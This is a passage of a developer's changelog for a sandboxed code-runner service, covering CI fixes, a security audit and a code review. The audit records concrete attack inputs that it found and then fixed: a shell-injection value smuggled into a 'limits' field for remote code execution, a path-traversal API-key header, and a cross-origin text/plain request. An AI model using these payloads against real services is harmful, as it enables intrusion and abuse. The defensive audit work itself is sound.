  `npm test`, which had shown 95/95 on every single one of the eight
  broken pushes and therefore proved nothing about this bug at all
- **the actual lesson, stated plainly:** this project's own testing
  philosophy — evidence over narration, distrust anything not directly
  observed — got applied rigorously to the *code* every single phase and
  never once to the CI pipeline meant to gate it. A green local run and
  a green CI run are different claims; only one of them was ever
  actually checked before being reported as both
- **two more, in the Action itself, found the same way:** once the habit
  of actually watching `gh run watch` instead of assuming took hold, the
  brand-new `action-test.yml` workflow (Phase 15) failed too, twice, on
  its first two real attempts:
  - the "Run through sandbin" step invoked the CLI as the plain
    unprivileged `runner` user, not root — `EACCES: permission denied,
    mkdir '/sys/fs/cgroup/.../sandbin.slice'`, the exact same cgroup
    requirement `ci.yml`'s own test step has always needed `sudo` for.
    Missed because local testing of the action's shell logic (Phase 15)
    simulated `GITHUB_OUTPUT` and `github.action_path` by hand, but
    never simulated *not having cgroup delegation as an unprivileged
    user* — the one thing that's actually different about a real
    Actions runner
  - fixed that, then hit a second one immediately: the CLI itself always
    exits `1` for a non-`ok` verdict, and GitHub Actions runs `run:`
    steps under `bash -e` by default — so for the deliberate
    `fail-on-error: false` test case, the script *aborted right there*,
    before ever reaching the output-writer logic that was supposed to
    read `fail-on-error` and decide whether to actually fail the step.
    `fail-on-error` was never getting consulted at all in the one case
    designed to prove it worked. `|| true` on that one line defers the
    decision entirely to the writer script, where it belongs — verified
    locally under `bash -e` for both `true` and `false` before pushing,
    this time, rather than pushing and hoping
  - both are now part of why `action-test.yml` exists at all: three real
    bugs in this session alone were caught by an actual runner and would
    not have been caught by any amount of additional local simulation,
    because the thing they were exercising — real cgroup privilege
    boundaries, real Actions runner shell defaults — doesn't exist to
    simulate locally in the first place

## Phase 17 — a full audit of the control plane, on request (done)

Requested directly: read `sandbox.mjs`, `policy.c` and `server.mjs` for
sandbox escapes, TOCTOU, FD/env leakage, `/proc`/`/sys` exposure, cgroup
lifecycle bugs, bwrap argument injection, missing syscalls, resource
exhaustion, queue/WebSocket DoS, API key/rate-limit bypass, permalink/data
store safety, the compile-vs-execute sandbox gap, and what actually
changes if this is exposed publicly. Every claim below was reproduced,
not just reasoned about — several were fixed in the same pass once found.

**Found and fixed, both confirmed exploitable before the fix:**

- **Unauthenticated RCE via `limits.openFiles`.** Interpolated straight
  into a shell script (`ulimit -n ${lim.openFiles}`) with no escaping,
  no validation, no type check — a single `POST /runs` with
  `limits: { openFiles: "64; touch /tmp/x #" }` ran the injected command
  as the sandbin process itself, and the `#` commented out the
  `exec bwrap` line that would have followed, so the sandbox never even
  started. Confirmed with a real file appearing on the host from one
  request. `fileSizeBytes` happened to be safe already — it's divided
  by 1024 before interpolation, which coerces a non-numeric string to
  `NaN` — but that was incidental, not a deliberate check, and
  `openFiles` sat right next to it with none. Fixed with
  `sanitizeLimits()`: every field in `limits` is coerced to a bounded
  integer (falling back to its default on anything non-numeric) before
  it's used for *anything* — cgroup writes, bwrap args, or the shell
  script — and the interpolation site re-asserts the coercion itself
  too, so it doesn't depend solely on every future caller remembering to
  sanitize first.
- **Path traversal via the `X-Sandbin-Key` header, into an arbitrary
  file read.** `apiKeys.load(headerKey)` got the raw header value with
  no validation. `GET /keys/:key` and `GET /r/:id/data` happened to be
  safe already, but only because their URL regex (`[^/]+`) can't capture
  a literal `/` — an accident of routing, not a check — and a header
  isn't a URL segment, so the same accident didn't cover it.
  `X-Sandbin-Key: ../../elsewhere/canary` resolved straight to a file
  outside `apiKeyDir` via `path.join`'s own `..` handling, confirmed
  with a real file whose fabricated `{key, requestsPerHour: 999999}`
  granted exactly that quota — and confirmed *end to end*, not just at
  the file-read layer: with the traversal in place, more than the real
  20/hour anonymous limit actually got through. Fixed with a strict
  format check (exactly what `issue()` / `randomUUID()` produce) applied
  to all three routes that accept one of these ids, not only the one
  proven exploitable.

**Found and fixed, real but not independently exploitable — leaks and
lifecycle bugs, several confirmed by reproducing them, not just reading
the code:**

- `ratelimit.mjs`'s bucket `Map` never removed an entry — confirmed with
  200,000 synthetic ids, the very first one still holding its original
  unreset count afterward. Every distinct id an attacker can present
  (trivially rotated on IPv6) grew this forever. Added `sweep()`, wired
  into the same hourly interval `permalinks.sweep()` already used.
- `apikeys.mjs` had no expiry at all — confirmed by backdating a key's
  `createdAt` five years and it still loading at full quota; `createdAt`
  was written and never once read back. Added a 90-day TTL + `sweep()`,
  mirroring `permalinks.mjs`.
- A malformed `limits` field made `createCgroup`'s `writeFile` throw,
  and nothing after that point ever ran — confirmed: one bad request
  left both the submitted source code (`hostDir`) and an orphaned cgroup
  directory on disk, on demand, with `sanitizeLimits()` now closing the
  trigger but the underlying fragility (cleanup only on the path that
  fell through to the end) fixed at its root too, with `try`/`finally`
  around both lifecycles.
- The hard-timeout backstop resolves the supervisor promise directly,
  without waiting for the child's `'close'` — but clearing
  `statsTimer`/`softTimer`/`hardTimer` only happened inside a `'close'`
  listener. JS's microtask-before-next-macrotask ordering guarantees
  the code after that `await` always runs first, proven with an isolated
  reproduction of the exact pattern — so whenever the hard timer is
  actually the one that settles (precisely the case it exists for), the
  interval was still armed when the result had already been returned.
  Fixed by clearing all three inside `settle()` itself.
- `warmGoCache()`'s own scratch directory (its `GOPATH` module cache)
  was never removed — confirmed 254 leaked directories on the machine
  this was found on, from testing alone, ~2 MB each. Fixed with
  `try`/`finally`.
- Writing the regression test for the `openFiles` fix found a second,
  self-inflicted bug: an initial `pids` floor of 1 in `sanitizeLimits`
  made even `print(1)` fail `pids.max`, because bwrap's own setup needs
  at least 3 concurrent processes for a single-process guest — verified
  empirically (`pids=2` fails, `pids=3` doesn't), floor set to 4.

**Checked and confirmed already correct, not just assumed:**

- FD leakage: a guest reading `/proc/self/fd` sees only 0/1/2 — the
  server's own listening socket and file handles do not leak into
  `spawn()`'s child chain.
- Environment leakage: a secret set on the server's own process
  (`SANDBIN_SUPER_SECRET_TOKEN`) is not visible to a guest running
  `env` — `--clearenv` plus the explicit `--setenv` allowlist holds.
- `/proc`/`/sys` exposure: `/sys` isn't mounted into the sandbox at all
  (absent from `buildBwrapArgs` entirely); `/proc` is scoped to the
  guest's own fresh PID namespace.
- Argument injection into `bwrap` itself: `argv`/`extraBinds`/`env` are
  always the fixed, hardcoded `IMAGES` table for the validated
  `language` — user code is written to a file and never appears as a
  command-line argument anywhere.

**The four lower-priority items above, followed up on request:**

- **WebSocket connection flooding, fixed.** Added `MAX_SOCKETS_PER_RUN`
  (10) in `attachSocket()` — past that many concurrent sockets on one
  run, a new connection gets an `error` event and is closed immediately
  instead of being attached. Per-run, not per-server, since the finished
  event and stats stream still need to reach every legitimate reconnect.
- **`maxPerKey` bypass via header rotation, fixed.** `concurrencyKey`
  used to be computed as `headerKey || ip` *before* the header was ever
  checked against `apikeys.load()` — any string in `X-Sandbin-Key`, real
  or not, got its own `maxPerKey` budget. Moved the computation inside
  the body-parsing callback, after `issuedKey` is resolved:
  `concurrencyKey = issuedKey ? headerKey : ip`. Only a header that
  actually round-trips through `apiKeys.load()` gets to pick its own
  partition now; anything else collapses to the caller's IP, which can't
  be freely rotated per request the way a header can. Confirmed with a
  regression test sending four concurrent runs under four different
  never-issued keys against `maxPerKey: 1` — before the fix all four
  would've been `accepted`; after, only the first is, and the other
  three come back `key_limit`.
- **`ioctl` argument filtering, investigated and deliberately not
  done.** The plan was to keep `ioctl` generally allowed but deny the
  two classic tty-injection request codes, `TIOCSTI` (0x5412) and
  `TIOCLINUX` (0x541C). Two independent things closed this out instead
  of a code change:
  - **libseccomp can't actually express it.** A single rule can't carry
    two `SCMP_CMP_NE` comparators on the same argument index — confirmed
    directly, `seccomp_rule_add()` returns `-EINVAL` for that shape, in
    this and the `_exact()` variant alike. And once *any* unconditional
    `ALLOW` exists for a syscall, a coexisting argument-filtered rule for
    that same syscall is never reached — confirmed with a standalone
    harness spawning a real pty: with a specific deny-`TIOCLINUX` rule
    and a generic ioctl-allow both present, the call still reached the
    real kernel and got the kernel's own `ENOTTY`, not the rule's
    distinguishing errno, regardless of which rule was added first or
    whether `seccomp_rule_add_exact()` was used instead. The only
    libseccomp-correct way to express "allow except N values" is an
    exhaustive allowlist of every legitimate request code instead — not
    viable for a syscall with as open-ended a surface as `ioctl` across
    four guest languages without a steady stream of breakage, the same
    failure mode this project already hit once with `umask`/`getsockopt`.
  - **It wouldn't matter here anyway.** `spawnInSandbox` gives the guest
    `stdio: ['pipe', 'pipe', 'pipe']` — never a pty — and `buildBwrapArgs`
    passes `--new-session`, so the guest has no controlling terminal to
    begin with. `--dev /dev` gives it a private, bwrap-owned device tree,
    not the host's; even a guest that deliberately opens its own
    `/dev/ptmx` and `TIOCSTI`s into its own slave is only talking to
    itself inside its own mount namespace — there's no host-trusted
    reader of that tty for the injection to ever reach. `ioctl` stays
    unfiltered in `policy.c`, unchanged from Phase 1.
- **`seccomp.mjs`'s cache-forever validity, fixed.** Removed the
  module-level `cachedPath` short-circuit; `ensureSeccompProgram()` now
  re-runs both `isStale()` checks on every call. Confirmed with two
  calls across a simulated `policy.bpf` mtime change — the second call
  now recompiles instead of trusting the first result forever.

103/103 tests passing (was 95) — 8 new adversarial/regression cases
across `test:sandbox`, `test:server`, `test:ratelimit` and
`test:apikeys`, each added specifically to keep one of the bugs above
from coming back silently.

## Phase 17 addendum — TOCTOU, a timing side-channel, and a CSRF-shaped
gap the first pass didn't reach (done)

The original request also asked specifically about TOCTOU and about what
changes if this sits on the public internet. Phase 17 named both in its
framing but didn't give either a dedicated, reproduced pass — this closes
that out, plus two things found by reading the rest of the surface with
the same scrutiny.

**A systematic TOCTOU sweep — one real bug found:**

- `ratelimit.mjs`'s `check()` and `queue.mjs`'s `submit()` both read a
  counter and act on it (increment, or admit/reject) with no `await`
  between the two — impossible to race, since nothing else can run
  mid-function on Node's single-threaded event loop. Confirmed by reading
  both, not assumed from "it's probably fine, it's JS."
- `attachSocket()`'s finished-check, socket-cap-check, and
  `record.sockets.add()` are the same story — one synchronous block, no
  yield point for a concurrent `ticket.result.then()` callback to land in
  between and flip `record.status` mid-check.
- **`apikeys.mjs`'s `load()` never actually checked TTL — it relied
  entirely on the hourly `sweep()` having already deleted the file.**
  `permalinks.mjs`'s `load()` (which `apikeys.mjs` was written to
  mirror) checks `now - record.savedAt > ttlMs` inline before ever
  returning a record; `apikeys.mjs`'s `load()` skipped that check
  entirely and just returned whatever it read. A key just past its
  90-day TTL kept working, at full quota, for up to an hour after
  expiring — the gap between "sweep runs" and "the record's own
  timestamp says it's dead." Confirmed by backdating a key past `ttlMs`
  and loading it with `sweep()` never once called: it loaded fine.
  Fixed by adding the same inline check `permalinks.mjs` already had.
- Both disk-backed stores' `sweep()` racing a concurrent `load()`'s own
  `unlink()` on the same file was checked too — both wrap the delete in
  `.catch(() => {})` / a try/catch that treats "already gone" as
  unremarkable, so this was never anything more than a benign race with
  the filesystem, not a bug.

**A timing side-channel in the metrics Basic Auth check, fixed.**
`metricsAuthorized()` compared the decoded username and password with
plain `===`, which short-circuits at the first mismatched byte —
a real, if slow, remote timing signal for guessing the metrics password
one byte at a time. Fixed with `crypto.timingSafeEqual`, and both the
username and password checks now always run rather than `a && b`
short-circuiting on the username alone (which would itself leak whether
the username guess was right, independent of the password).

**A CSRF-shaped path into `POST /runs` via a CORS-safelisted
Content-Type, fixed.** `readJsonBody()` never checked the request's own
`Content-Type` header — it parsed whatever bytes arrived as JSON
regardless of what the header declared. `application/json` isn't
CORS-safelisted, so a genuine cross-origin `fetch()` with that header
gets forced onto the preflight path and blocked, since this server never
answers `OPTIONS` or sends `Access-Control-Allow-Origin`. But
`text/plain` *is* safelisted — no preflight required — and nothing
stopped a JSON-shaped body from arriving under that header instead.
Confirmed directly: a `POST /runs` with `Content-Type: text/plain` and
`Origin: https://evil.example` was accepted (202) and queued exactly
like a same-origin request. Any page a visitor happened to have open
could have silently submitted runs under that visitor's own IP — not a
privilege escalation (there's no session to hijack, and the opaque
no-cors response can't be read back), but a real request-forgery /
queue-and-rate-limit-abuse vector with no legitimate reason to allow it.
Fixed by requiring `Content-Type: application/json` before parsing;
confirmed the three real callers (`bin/sandbin.mjs`, `public/app.js`,
`src/loadtest.mjs`) already send it.

**Compile-vs-execute sandbox gap, checked and confirmed already
correct.** The concern was that C/Go compilation might run under a
different, weaker sandbox than the resulting binary's execution. Reading
`sandbox.mjs`'s `run()`: the compile step (`spec.compile`) and the
execution step both go through the exact same `spawnInSandbox()` — same
`buildBwrapArgs`, same `--seccomp` fd, same cgroup mechanism. The only
difference is `COMPILE_LIMITS` (a fixed, non-attacker-controlled object,
sized for compiling one small file rather than running the result) and
`boxWritable: true` so the compiler can write its output into `/box`.
No separate, less-restricted path exists.

**What actually changes if this sits on the public internet — written
down instead of left implicit:**

- Anonymous, unauthenticated arbitrary code execution is the deliberate
  feature, not an oversight — the isolation is the entire security
  model for that path, gated only by the anonymous rate limit and
  per-IP concurrency. Anyone deploying this publicly should understand
  that plainly, not discover it later.
- **This server speaks plain HTTP, not TLS.** Deploying it directly on
  the public internet means every request — including `X-Sandbin-Key`
  — travels in cleartext. It needs a TLS-terminating reverse proxy
  (nginx, Caddy, a cloud load balancer) in front for any real
  deployment; nothing in this codebase does that itself, and nothing
  should try to badly.
- **Rate limiting and `maxPerKey` key off `req.socket.remoteAddress`
  directly.** That's correct only when this process sees the real
  client's TCP connection. Behind a reverse proxy, every request arrives
  from the proxy's own address — every real visitor collapses into one
  shared bucket unless the proxy's real-IP header is both trusted and
  parsed. Deliberately *not* implemented here: blindly trusting
  `X-Forwarded-For` from the client is itself a spoofing vector — a
  value sandbin can't tell apart from one an attacker set directly —
  and doing it correctly requires knowing, per deployment, which hop is
  actually the trusted proxy. That's real, varies by operator, and
  isn't something to guess at in-app; it's called out here as a genuine
  limitation instead.
- **Permalinks are public by design, unguessable but unauthenticated.**
  A finished run's `/r/:id/data` is fetchable by anyone with the link —
  `id` is a `randomUUID()` (122 bits), not brute-forceable, but there's
  no owner check and no way to un-share one. Anything typed into code or
  stdin becomes a link anyone who gets it can read for 30 days. That's
  the intended feature (shareable permalinks), but worth being explicit
  that "shareable" and "not secret" are the same property here.
- `/metrics` being open by default (rather than requiring
  `SANDBIN_METRICS_USER`/`SANDBIN_METRICS_PASS`) was already flagged at
  process startup with a console warning before this pass; that stays
  as-is, just noted here for completeness.

105/105 tests passing (was 103) — the TOCTOU sweep found and fixed one
real bug (`apikeys.mjs` load-time TTL), plus one CSRF regression test
for the Content-Type check. The timing side-channel fix has no test of
its own — a timing assertion doesn't belong in a CI suite — but the
existing Basic Auth accept/reject tests already cover its functional
behavior unchanged.

## Phase 18 — a multi-angle review of the whole week's diff (done)

Requested directly: review everything from the RCE fix through the docs
pass (`76522e8^..HEAD`, ~1300 lines) for correctness bugs and cleanup,
not just security. Ten finder angles ran in parallel — line-by-line scans
of both halves of the diff, a removed-behavior audit, a cross-file
caller/callee trace, JS-pitfall and wrapper-correctness checks, reuse and
simplification, efficiency and altitude, and a dedicated test-file
correctness pass — followed by an independent verification pass (most
candidates reproduced directly rather than taken on the finder's word)
and a final gap sweep. 15 findings survived; all 15 fixed.

**Two crash risks in this same week's own commits:**

- `spawnInSandbox` never registered `child.on('error', ...)`. Node never
  emits `'close'` for a child that fails to launch at all (`ENOENT`, or
  `EMFILE`/`EAGAIN`/`ENOMEM` under the fd/process exhaustion this service
  is specifically built to run into under load) — it emits `'error'`
  instead, and an unhandled `'error'` event throws synchronously,
  crashing the *entire* process, not just the one request. Confirmed by
  reproducing the same spawn-with-only-a-close-listener shape against a
  nonexistent binary. Fixed by settling with a new `spawn_failed` verdict
  instead of letting the error propagate unhandled.
- `warmGoCache()`'s own leaked-directory fix from Phase 17 put the new
  `rmSync()` cleanup in `finally`, but outside the function's existing
  `try`/`catch` — built specifically so a warm-up problem never takes the
  process down. Any non-`ENOENT` failure (a locked-down tmp mount) would
  have thrown uncaught during module import, crashing the server before
  it ever started listening — strictly worse than the small leak that fix
  was closing. Fixed by wrapping the cleanup in its own `try`/`catch`.

**`sanitizeLimits()` had three separate gaps, all in the same function
added last phase:**

- Its own comment said "a non-numeric value falls back to the default" —
  but `Number(null)`, `Number(false)`, `Number('')` and `Number([])` are
  all the finite value `0`, which took the *clamp* path (landing on the
  minimum bound) instead of the *default* path. Confirmed:
  `{ wallClockMs: null }` produced `100`, not the documented `5000`.
  Fixed by requiring the raw input actually be a number or non-empty
  string before coercing at all.
- The CLI's own `--timeout`/`--memory` "override" flags silently hit the
  same 60s/512MB ceiling meant for an anonymous HTTP caller — confirmed
  live: `sandbin run job.py --timeout 120000` still stopped at ~60s, with
  nothing telling the user their flag was overridden. Fixed with a
  separate `LOCAL_LIMIT_BOUNDS` (600s / 4GB) that only the CLI's local run
  path opts into explicitly — the HTTP path's own call site never
  specifies bounds, so it can't drift wider by accident.
- The upper-bound clamp (`Math.min(bounds.max, ...)`) had zero test
  coverage in either direction — only the underflow/NaN side was
  exercised. Added a case requesting `memoryBytes: 999_999_999_999` and
  confirming an allocation just above the real 512MB ceiling still gets
  OOM-killed, proving the enforced limit is the clamped value, not the
  requested one.

**`MAX_CHUNKS` (Phase 17's chunk-count DoS fix) mislabeled its own
truncation.** A program flushing very frequently in tiny writes (a
progress/heartbeat loop) could hit the 4000-chunk cap while nowhere near
the byte budget, and got reported as `output_limit` — "you produced too
much output" — when what actually happened was "you flushed too often."
Confirmed: 4500 rapid one-line prints hit the chunk cap at 18.8KB, far
under even the default 64KB byte cap. Fixed with a distinct `chunk_limit`
verdict for exactly this case.

**The CSRF Content-Type fix (Phase 17 addendum) had its own bypass of the
body-size cap.** `readJsonBody()` rejected a bad Content-Type *before*
the `'data'` listener that enforces `MAX_BODY_BYTES` was ever attached —
so for any non-JSON request, the 2MB cap didn't apply at all; Node's own
keep-alive drain silently absorbed the whole body regardless of size.
Confirmed live with a 200MB body under `Content-Type: text/plain`
completing in 93ms, fully absorbed — the exact request shape the CSRF fix
targets, still able to consume unbounded bandwidth. The first fix
attempt (`req.destroy()` on mismatch) closed that but broke the client's
ability to ever receive the 400 — destroying `req` tears down the socket
`res` writes to. Landed on: the size-capping listener is now always
attached regardless of content type (a non-JSON body is drained and
counted but not buffered), and `req.destroy()` only fires once the cap is
actually exceeded — a reasonably-sized wrong-content-type request still
gets a clean 400.

**No WebSocket heartbeat meant a zombie connection could lock a client
out of its own run.** `record.sockets` only shrank on a clean `'close'`;
a connection that dropped uncleanly (network switch, sleep, a NAT
timeout with no RST) left a zombie entry nothing removed. A client
reconnecting repeatedly over a flaky connection could accumulate zombies
toward `MAX_SOCKETS_PER_RUN` and get "too many connections" to its own
run. Fixed with standard ws ping/pong: anything that hasn't ponged since
the last sweep gets terminated, which fires `'close'` and lets the
existing cleanup run normally. Regression test forces a live socket into
a truly-unreachable state (its own `ping()` replaced with a no-op, so a
real client can't auto-pong its way back to "alive") and confirms it's
reaped within two sweep cycles.

**Two of the Phase 17 path-traversal regression tests didn't actually
test anything.** Both used `encodeURIComponent('../etc/passwd')`-style
payloads — which percent-encodes `/` to `%2F`, and since Node never
decodes `req.url` before route matching, the payload always lands as one
harmless, nonexistent-file segment regardless of whether the format-check
guard exists. Confirmed by disabling the guard in a scratch copy and
rerunning the identical test: still 404, still green. Separately, a
*raw*, un-encoded traversal can't reach these two routes at all — their
`[^/]+` route regex can't match a path containing a literal `/`, so real
traversal was never actually possible here structurally, guard or not.
What the guard actually protects against is different: an id shaped
wrong but pointing at a real file that exists in the store directory.
Rewrote both tests to prove exactly that — plant a real file under a
non-conforming name and confirm it's still refused — and confirmed *these*
versions do fail when the guard is disabled.

**Two tests had real, demonstrated flakiness risk.** `apikeys-test.mjs`'s
TTL sweep test backdated its "expired" key with a 5000ms margin but left
its "still valid" key riding on real wall-clock time with zero margin
against a 1000ms TTL — reproduced the flake directly by injecting a
1100ms delay into the same sequence. Fixed by pinning every check to one
fully-injected `now`, removing real time from the test entirely.
`ratelimit-test.mjs`'s sweep test asserted `peek(...).count === 0` after
sweeping, but `peek()` already synthesizes `{count: 0}` for any bucket
past its own `resetAt` whether or not the `Map` entry was actually
deleted — a `sweep()` that silently no-ops on `buckets.delete()` (the
exact unbounded-growth bug it exists to fix) would pass the same
assertion. Added a `size()` accessor to `ratelimit.mjs` and asserted on
it directly: 51 buckets before sweeping, 1 after.

**Cleanup, not bugs:**

- `apikeys.mjs`'s `sweep()` and `load()`'s TTL check were near-verbatim
  copies of `permalinks.mjs`'s versions, differing only in which
  timestamp field they read — exactly the kind of duplication that let
  the load-time TTL check go missing in one copy but not the other back
  in the Phase 17 addendum. Extracted both into a new `src/ttl-store.mjs`
  shared by both stores.
- `API_KEY_FORMAT` was hand-duplicated in `server.mjs`, disconnected from
  `apikeys.mjs`'s actual key generation — a future change to key shape
  could silently desync the two. Now exported from `apikeys.mjs`, next to
  `issue()`, and imported where it's checked.
- The `maxPerKey` fix's real side effect — legitimate callers behind a
  shared IP now share one concurrency budget, where each could previously
  pick an arbitrary header string for an independent one — was accurate
  but never stated plainly. Documented at the fix site.
- `server-test.mjs`'s own traversal-canary test leaked its scratch
  directory on any thrown exception; wrapped in `try`/`finally` like every
  other resource in the same file.

108/108 tests passing (was 105).

## Phase 19 — a real question about `--server` reliability, answered by fixing the gap it named (done)

A comment on a public post asked, correctly: if the WebSocket drops before
`finished`, can `sandbin run --server` reconnect to that run, or does
retrying submit a second job? Answering it honestly required checking, not
assuming — and checking turned up an actual bug alongside the missing
feature.

- **The bug:** `runRemote()` had no `ws.on('close', ...)` handler. A drop
  that fires a clean `close` without ever emitting a socket-level `error`
  (server restart, proxy timeout, network blip) left the CLI's Promise
  permanently unresolved — the process would hang forever instead of
  exiting with a clear failure. Only the `error` event was handled; `close`
  wasn't, so nothing ever settled the Promise on that path.
- **The missing feature:** the server-side protocol already supported
  reconnecting to a run in progress or replaying a finished one
  (`attachSocket()`, covered by the "reconnecting after finish replays the
  final result" server test) — but the CLI never exposed the `runId` to
  the caller anywhere, so there was no way to actually use it. Re-running
  `sandbin run` always submitted a brand-new job; `POST /runs` has no
  idempotency key.
- **The fix:** extracted the WebSocket-watching logic into a shared
  `watchRun()`, added a `settled` guard so a `close` arriving after an
  already-resolved `finished`/`error` is a no-op, and added a
  `ws.on('close', ...)` handler that resolves cleanly instead of hanging.
  The CLI now prints the accepted run's id up front, and again if the
  connection drops, specifically so a caller has something to act on. A
  new `--reconnect <runId>` flag skips submission and reattaches directly
  — for a caller that kept the id, retrying is now safe and doesn't spawn
  a duplicate sandbox.
- Three new CLI tests, run against a real server: reconnecting to a
  finished run replays its result rather than resubmitting, reconnecting
  to an unknown id fails cleanly (not a hang), and `--reconnect` without
  `--server` is rejected immediately.

The honest remaining boundary, documented rather than papered over: a
plain `sandbin run` retry is still not idempotent. `--reconnect` only
helps a caller that captured the `runId` before the drop; there is still
no way to resume by resubmitting the same code.

111/111 tests passing (was 108).

## What's left

Closing real gaps rather than adding breadth for its own sake, roughly in
the order they're worth doing:

- **Embeddable widget.** A small script + iframe another site could drop
  in to embed a working sandbin playground, reusing the existing
  streaming API rather than building a second one.
- **Rust, revisited.** Still shelved from Phase 10 — the actual blocker
  was diagnostic, not architectural: confirming the hypothesis (`rustc`
  issuing a raw syscall no libc entry point catches) needs `strace` or
  root-level tracing that wasn't available where this was investigated.
  Worth another pass specifically if that access becomes available, not
  worth guessing at a fix without it.

Deliberately *not* on this list: horizontal scaling / multi-instance
support. That would mean moving the queue, rate limiter and metrics off
in-process state and onto something shared (Redis or equivalent) — a real
architectural shift away from "single process, no database, no external
dependency beyond `ws`," which is a stated design choice here, not an
oversight. Worth reconsidering only if this ever needs to run as more
than one process for real, not preemptively.
